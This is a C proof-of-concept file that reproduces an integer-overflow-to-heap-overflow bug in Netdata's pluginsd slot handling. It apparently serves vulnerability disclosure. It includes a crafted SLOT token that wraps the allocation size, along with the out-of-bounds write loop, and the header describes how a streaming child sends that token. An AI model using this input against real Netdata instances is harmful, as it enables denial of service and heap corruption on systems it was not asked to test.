// SPDX-License-Identifier: GPL-3.0-or-later
//
// Standalone PoC for the integer-overflow -> heap buffer overflow in
// Netdata's pluginsd dimension slot caching.
//
// It faithfully reproduces the *exact* arithmetic and control flow of:
//   - src/plugins.d/pluginsd_internals.h : pluginsd_parse_rrd_slot()
//   - src/database/rrdset-pluginsd-array.h : prd_array_create()
//   - src/plugins.d/pluginsd_internals.h : pluginsd_rrddim_put_to_slot()
//
// A streaming child controls the SLOT: value via str2ull_encoded (full 64-bit,
// only negatives are clamped). That value becomes both the allocation size
// multiplier AND arr->size (loop bound). The multiplication
//   sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim)
// overflows size_t, yielding a tiny allocation with a huge logical size, and
// the subsequent initialization loop writes out of bounds.
//
// Build:  gcc -O0 -g -fsanitize=address -o poc_prd_overflow poc_prd_overflow.c
// Run  :  ./poc_prd_overflow 0xaaaaaaaaaaaaaab
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <inttypes.h>

// ---- replicas of the real structures ----
struct pluginsd_rrddim {        // src/database/rrddim.h
    void *rda;
    void *rd;
    const char *id;
};

typedef struct pluginsd_rrddim_array {   // src/database/rrdset-pluginsd-array.h
    int32_t refcount;
    size_t size;
    struct pluginsd_rrddim entries[];     // flexible array member
} PRD_ARRAY;

// ---- replica of prd_array_create() (callocz -> calloc(1, n)) ----
static PRD_ARRAY *prd_array_create(size_t size) {
    // EXACT expression from the codebase:
    size_t bytes = sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim);
    fprintf(stderr, "[*] prd_array_create(size=%zu): requesting %zu bytes (calloc)\n", size, bytes);
    PRD_ARRAY *arr = (PRD_ARRAY *)calloc(1, bytes);   // callocz(1, bytes)
    if(!arr) { fprintf(stderr, "[!] calloc failed -> in the agent this is fatal() = process exit (DoS)\n"); exit(2); }
    arr->refcount = 1;
    arr->size = size;                                  // <-- huge logical size kept
    fprintf(stderr, "[*] allocated %zu real bytes but arr->size=%zu (entries claimed)\n", bytes, arr->size);
    return arr;
}

// ---- replica of str2ull_encoded for hex (0x...) ----
static unsigned long long str2ull_encoded(const char *s) {
    if(s[0]=='0' && (s[1]=='x'||s[1]=='X'))
        return strtoull(s+2, NULL, 16);
    return strtoull(s, NULL, 10);
}

// ---- replica of pluginsd_parse_rrd_slot() core (the SLOT: id[5] parse) ----
static ssize_t parse_slot(const char *slot_token) {
    ssize_t slot = (ssize_t) str2ull_encoded(slot_token);
    if(slot < 0) slot = 0;   // ONLY clamp: negatives. No upper bound.
    return slot;
}

// ---- replica of the vulnerable part of pluginsd_rrddim_put_to_slot() ----
static void put_to_slot(ssize_t slot) {
    size_t wanted_size;
    if(slot >= 1)
        wanted_size = (size_t)slot;        // attacker controlled, unbounded
    else
        wanted_size = 4;                   // (dictionary_entries() in real code)

    size_t current_size = 0;               // first DIMENSION for this chart
    if(wanted_size > current_size) {
        PRD_ARRAY *new_arr = prd_array_create(wanted_size);

        // init loop from the codebase: writes 24 bytes per index up to wanted_size
        fprintf(stderr, "[*] entering init loop: for(i=%zu; i<%zu; i++) new_arr->entries[i]=...\n",
                current_size, wanted_size);
        for(size_t i = current_size; i < wanted_size; i++) {
            new_arr->entries[i].rda = NULL;   // <-- OOB heap write happens almost immediately
            new_arr->entries[i].rd  = NULL;
            new_arr->entries[i].id  = NULL;
            if(i == current_size)
                fprintf(stderr, "[*] wrote entries[%zu] (offset %zu) into a %zu-byte buffer\n",
                        i, sizeof(PRD_ARRAY)+i*sizeof(struct pluginsd_rrddim),
                        sizeof(PRD_ARRAY)+wanted_size*sizeof(struct pluginsd_rrddim));
        }
    }
}

int main(int argc, char **argv) {
    const char *slot_token = (argc > 1) ? argv[1] : "0xaaaaaaaaaaaaaab";
    fprintf(stderr, "[*] simulating: CHART ...\\n  DIMENSION SLOT:%s mydim\n", slot_token);
    ssize_t slot = parse_slot(slot_token);
    fprintf(stderr, "[*] parsed slot = %zd (0x%zx)\n", slot, (size_t)slot);
    put_to_slot(slot);
    fprintf(stderr, "[+] returned without crash (unexpected for overflow token)\n");
    return 0;
}
